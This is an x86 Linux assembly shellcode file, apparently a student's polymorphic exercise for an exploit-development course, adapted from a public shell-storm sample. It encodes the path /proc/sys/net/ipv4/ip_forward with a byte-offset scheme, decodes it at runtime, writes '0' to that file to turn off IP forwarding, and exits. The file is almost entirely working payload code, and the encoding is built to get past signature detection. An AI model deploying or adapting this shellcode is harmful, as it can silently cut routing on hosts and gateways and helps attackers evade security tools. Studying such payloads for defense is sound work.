; Student:   SLAE-755
; Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() 
; http://shell-storm.org/shellcode/files/shellcode-848.php

global _start			

section .text

_start:

	sub	eax,  eax
	push	eax

	; python -c "print '\x64\x72\x61\x77\x72\x6f\x66\x5f\x70\x69\x2f\x34\x76\x70\x69\x2f\x74\x65\x6e\x2f\x2f\x73\x79\x73\x2f\x63\x6f\x72\x70\x2f'"
	; drawrof_pi/4vpi/ten//sys/corp/


	; TODO decremanta la key	
	push	dword 0x54625167
	push	dword 0x625f564f
	push	dword 0x60591f24
	push	dword 0x6660591f
	push	dword 0x64555e1f
	push	dword 0x1f636963
	push	dword 0x1f535f62


	mov	ebx,esp

	decode:
		mov cl, byte [ebx]
		add cl, 0x10
		mov byte [ebx], cl

		inc ebx
		; 0x64 is the last byte we need to decode 
		; and it is the only one in the push sequence
		cmp cl, 0x64
		jnz short decode






	push	word 0x702f


	mov	ebx,esp
	xor	ecx, ecx
	mov	cl,0x1
	; #define __NR_open 5 syscall
	mov	al,0x4
	inc	al
	int	0x80


	mov	ebx,eax
	xor	ecx, ecx
	mov	edx, ecx
	push	ecx
	push	byte +0x30
	mov	ecx,esp
	mov	dl,0x1
	; #define __NR_write 4
	mov	al,0x4
	int	0x80


	xor     eax, eax
	; #define __NR_close 6
	add	eax,byte +0x6
	int	0x80

	; exit() procedure
	xor     eax, eax
	mov	ebx, eax
	inc	eax
	int 0x80
